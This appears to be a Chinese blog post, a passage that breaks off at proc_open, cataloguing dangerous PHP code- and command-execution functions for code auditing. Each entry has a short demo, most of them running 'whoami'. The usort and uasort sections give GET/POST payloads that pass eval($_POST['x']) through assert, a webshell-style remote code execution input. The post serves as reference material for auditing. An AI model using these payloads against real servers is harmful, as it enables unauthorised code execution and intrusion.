<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/header.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/header.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/header.jpg?v=5.1.4">






  <meta name="keywords" content="PHP,危险函数,代码审计," />





  <link rel="alternate" href="/atom.xml" title="joker0xxx3's Blog" type="application/atom+xml" />






<meta name="description" content="PHP代码审计危险函数">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP代码审计危险函数">
<meta property="og:url" content="http://joker-vip.github.io/2021/04/25/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/index.html">
<meta property="og:site_name" content="joker0xxx3&#39;s Blog">
<meta property="og:description" content="PHP代码审计危险函数">
<meta property="og:image" content="https://image.3001.net/images/20210425/16193177504420.png">
<meta property="og:image" content="https://image.3001.net/images/20210425/16193177609106.png">
<meta property="og:image" content="https://image.3001.net/images/20210425/16193177636677.png">
<meta property="article:published_time" content="2021-04-25T01:41:25.000Z">
<meta property="article:modified_time" content="2021-04-25T09:34:47.666Z">
<meta property="article:author" content="joker0xxx3">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="危险函数">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://image.3001.net/images/20210425/16193177504420.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://joker-vip.github.io/2021/04/25/php代码审计危险函数/"/>





  <title>PHP代码审计危险函数 | joker0xxx3's Blog</title>
  








<meta name="generator" content="Hexo 4.2.1"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>
	<a href="https://github.com/joker-vip" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
	
    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">joker0xxx3's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">现实告诉我： 保持好奇心，享受孤独</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://joker-vip.github.io/2021/04/25/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="joker0xxx3">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="joker0xxx3's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">PHP代码审计危险函数</h1>
        

        <div class="post-meta">
          <span class="post-time">
		    
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-04-25T09:41:25+08:00">
                2021-04-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="PHP代码审计危险函数"><a href="#PHP代码审计危险函数" class="headerlink" title="PHP代码审计危险函数"></a>PHP代码审计危险函数</h1><a id="more"></a>


<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>( string $code) : mixed</span><br></pre></td></tr></table></figure>

<p><code>eval()</code>函数就是将传入的字符串当作 <code>PHP</code> 代码来进行执行。</p>
<h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><p>PHP 5</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert( mixed $assertion[, string $description] ) : bool</span><br></pre></td></tr></table></figure>

<p>PHP 7</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert( mixed $assertion[, Throwable $exception] ) : bool</span><br></pre></td></tr></table></figure>

<p>在PHP 5 中，是一个用于执行的字符串或者用于测试的布尔值。在PHP 7 中，可以是一个返回任何值的表达式，它将被执行结果用于判断断言是否成功。</p>
<h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>此函数执行一个正则表达式的搜索和替换。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = <span class="number">-1</span> [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li>
<li>$replacement: 用于替换的字符串或字符串数组。</li>
<li>$subject: 要搜索替换的目标字符串或字符串数组。</li>
<li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li>
<li>$count: 可选，为替换执行的次数。</li>
</ul>
<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><p><code>create_function()</code>用来创建一个匿名函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function( string $args, string $code) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>string $args 声明的函数变量部分</li>
<li>string $code 要执行的代码</li>
</ul>
<p><code>create_function()</code>函数在内部执行<code>eval()</code>函数，所以我们就可以利用这一点，来执行代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $onefunc = create_function(<span class="string">'$a'</span>,<span class="string">'return system($a);'</span>);</span><br><span class="line">	$onefunc(whoami);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h4><p><code>array_map()</code>为数组的每个元素应用回调函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map( callable $callback, <span class="keyword">array</span> $array1[, <span class="keyword">array</span> $...] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure>

<p><strong>array_map()</strong>：返回数组，是为 <code>array1</code> 每个元素应用 <code>callback</code>函数之后的数组。<code>callback</code> 函数形参的数量和传给<code>array_map()</code> 数组数量，两者必须一样。</p>
<p>参数 </p>
<ul>
<li>callback：回调函数，应用到每个数组里的每个元素。</li>
<li>array1：数组，遍历运行<code>callback</code>函数。</li>
<li>…：数组列表，每个都遍历运行<code>callback</code>函数。</li>
</ul>
<p>通过<code>array_map()</code>这个函数，来调用用户自定义的函数，而用户这里的回调函数其实就是<code>system</code>函数，那么就相当于我们用<code>system</code>函数来对旧数组进行操作，得到新的数组，那么这个新的数组的结果就是我们想要的命令执行的结果了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $func = <span class="string">'system'</span>;</span><br><span class="line">    $cmd = <span class="string">'whoami'</span>;</span><br><span class="line">    $old_array[<span class="number">0</span>] = $cmd;</span><br><span class="line">    $new_array = array_map($func,$old_array);</span><br><span class="line">    var_dump($new_array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><p><code>call_user_func()</code>是把第一个参数作为回调函数调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func( callable $callback[, mixed $parameter[, mixed $...]] ) : mixed</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<p>第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。</p>
<ul>
<li>callback：即将被调用的回调函数</li>
<li>parameter：传入回调函数的参数</li>
</ul>
<p>在前面自定义的函数中加入能执行命令的代码就可以代码执行了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system($a);</span><br><span class="line">    &#125;</span><br><span class="line">    $cmd = <span class="string">'whoami'</span>;</span><br><span class="line">    call_user_func(<span class="string">'callback'</span>,$cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h4><p>这个函数名称跟上没什么大的差别，唯一的区别就在于参数的传递上，这个函数是把一个数组作为回调函数的参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array( callable $callback, <span class="keyword">array</span> $param_arr) : mixed</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>callback：被调用的回调函数</li>
<li>param_arr：要被传入回调函数的数组，这个数组需要是索引数组</li>
</ul>
<p>示例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system($a);</span><br><span class="line">    &#125;</span><br><span class="line">    $cmd = <span class="keyword">array</span>(<span class="string">'whoami'</span>);</span><br><span class="line">    call_user_func_array(<span class="string">'callback'</span>,$cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h4><p>用回调函数过滤数数组中的单元</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_filter( <span class="keyword">array</span> $array[, callable $callback[, int $flag = <span class="number">0</span>]] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure>

<p>依次将<code>array</code>数组中的每个值传到<code>callback</code>函数。如果<code>callback</code>函数返回<code>true</code>，则<code>array</code>数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
<p>参数 </p>
<ul>
<li>array：要循环的数组</li>
<li>callback：使用的回调函数。如果没有提供<code>callback</code>函数，将删除<code>array</code>中所有等值为FALSE的条目。</li>
<li>flag：决定<code>callback</code>接收的参数形式</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cmd=<span class="string">'whoami'</span>;</span><br><span class="line">    $array1=<span class="keyword">array</span>($cmd);</span><br><span class="line">    $func =<span class="string">'system'</span>;</span><br><span class="line">    array_filter($array1,$func);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h4><p>使用用户自定义的比较函数对数组中的值进行排序</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort( <span class="keyword">array</span> &amp;$array, callable $value_compare_func) : bool</span><br></pre></td></tr></table></figure>

<p>参数</p>
<ul>
<li>array：输入的数组</li>
<li>cmp_function：在第一个参数小于、等于或大于第二个参数时，该比较函数必须相应地返回一个小于、等于或大于0的数</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    usort(...$_GET);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: <span class="number">1.</span>php?<span class="number">1</span>[<span class="number">0</span>]=<span class="number">0</span>&amp;<span class="number">1</span>[<span class="number">1</span>]=<span class="keyword">eval</span>($_POST[<span class="string">'x'</span>])&amp;<span class="number">2</span>=assert</span><br><span class="line">POST传参: x=phpinfo();</span><br></pre></td></tr></table></figure>

<p><code>usort</code>的参数通过GET传参，第一个参数也就是<code>$_GET[0]</code>，随便传入一个数字即可。第二个参数也就是<code>$_GET[1]</code>是我们要调用的函数名称，这里采用的是<code>assert</code>函数。</p>
<h4 id="uasort"><a href="#uasort" class="headerlink" title="uasort()"></a>uasort()</h4><p>这个跟上一个差不多，区别不是很大。此函数对数组排序并保持索引和单元之间的关联。也就是说你这个排完序之后呢，它原来对应的索引也会相应改变，类似于“绑定”。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uasort( <span class="keyword">array</span> &amp;$array, callable $value_compare_func) : bool</span><br></pre></td></tr></table></figure>

<p>参数</p>
<ul>
<li>array：输入的数组</li>
<li>value_compare_func：用户自定义的函数</li>
</ul>
<p>在排完序之后索引也跟着值的位置变化而变化了。那么代码执行的示例代码其实也和上一个差不多。</p>
<p>代码示例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">	$onearray = <span class="keyword">array</span>(<span class="string">'Ameng'</span>, $_POST[<span class="string">'x'</span>]);</span><br><span class="line">	uasort($onearray, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">payload: <span class="number">1.</span>php?a=assert</span><br><span class="line">POST传参: x=phpinfo();</span><br></pre></td></tr></table></figure>

<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>这个函数想必我们都是比较熟悉的，此函数就是执行外部指令，并且显示输出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system( string $command[, int &amp;$return_var] ) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：必需。要执行的命令</li>
<li>return_var：可选。若设置了这个参数，那么命令执行后的返回状态就会被放到这个变量中</li>
</ul>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cmd = <span class="string">'whoami'</span>;</span><br><span class="line">    system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>这个其实和上面<code>system</code>函数没有太大区别，都是执行外部程序指令，只不过这个函数多了一个参数，可以让我们把命令执行输出的结果保存到一个数组中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec( string $command[, <span class="keyword">array</span> &amp;$output[, int &amp;$return_var]] ) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：必需。要执行的命令</li>
<li>output：可选。如果设置了此参数，那么命令执行的结果将会保存到此数组。</li>
<li>return_var：可选。命令执行的返回状态。</li>
</ul>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">'whoami'</span>;</span><br><span class="line"><span class="keyword">echo</span> exec($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>此函数通过shell环境执行命令，并且将完整的输出以字符串的方式返回。如果执行过程中发生错误或者进程不产生输出，那么就返回<code>NULL</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec( string $cmd) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>cmd：要执行的命令</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">'whoami'</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>执行外部程序并且显示原始输出。既然我们已经有执行命令的函数了，那么这个函数我们什么时候会用到呢？当所执行的Unix命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代<code>exec()</code>或<code>system()</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru( string $command[, int &amp;$return_var] ) : void</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：要执行的命令</li>
<li>return_var：Unix命令的返回状态将被记录到此函数。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一、</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    passthru(<span class="string">'whoami'</span>);	<span class="comment">//直接将结果返回到页面</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">二、</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    passthru(<span class="string">'whoami'</span>,$result);	<span class="comment">//将结果返回到一个变量，然后通过输出变量值得到输出内容</span></span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>在当前进程空间执行指定程序。关键点就在于进程空间，倘若我现在设定一个条件，你只有在某个子进程中才能读取phpinfo，那这个时候，我们就需要用到这个函数了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec( string $path[, <span class="keyword">array</span> $args[, <span class="keyword">array</span> $envs]] ) : void</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>path：path必须时可执行二进制文件路径或在一个文件第一行指定了一个可执行文件路径标头的脚本(比如文件第一行是#!/usr/local/bin/perl的perl脚本)</li>
<li>args：此参数是一个传递给程序的参数的字符串数组</li>
<li>envs：环境变量，这个想必大家都很熟悉，只不过这里强调一点，这里传入的是数组，数组格式是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。</li>
</ul>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//father</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	pcntl_exec(<span class="string">'/usr/local/bin/php'</span>, [<span class="string">'2.php'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//son</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ok'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>此函数使用command参数打开进程文件指针。如果出错，那么该函数就会返回FALSE。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(command,mode)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：要执行的命令</li>
<li>mode：必需。规定连接的模式<ul>
<li>r：只读</li>
<li>w：只写（打开并清空已有文件或创建一个新文件）</li>
</ul>
</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = popen(<span class="string">"demo.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">	pclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = popen(<span class="string">"/bin/ls"</span>,<span class="string">"r"</span>);</span><br><span class="line"><span class="comment">//some code to be executed</span></span><br><span class="line">pclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h4><p>此函数执行一个命令，并且打开用来输入或者输出的文件指针</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_open( string $cmd, <span class="keyword">array</span> $descriptorspec, <span class="keyword">array</span> &amp;$pipes[, string $cwd = <span class="keyword">NULL</span>[, <span class="keyword">array</span> $env = <span class="keyword">NULL</span>[, <span class="keyword">array</span> $other_options = <span class="keyword">NULL</span>]]] )</span><br></pre></td></tr></table></figure>

<p>此函数其实和<code>popen</code>函数类似，都是执行命令</p>
<p>参数 </p>
<ul>
<li>cmd：要执行的命令</li>
<li>descriptorspec：索引数组。数组中的键值表示描述符，元素值表示 PHP 如何将这些描述符传送至子进程。0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。</li>
<li>pipes：将被置为索引数组，其中的元素是被执行程序创建的管道对应到PHP这一段的文件指针。</li>
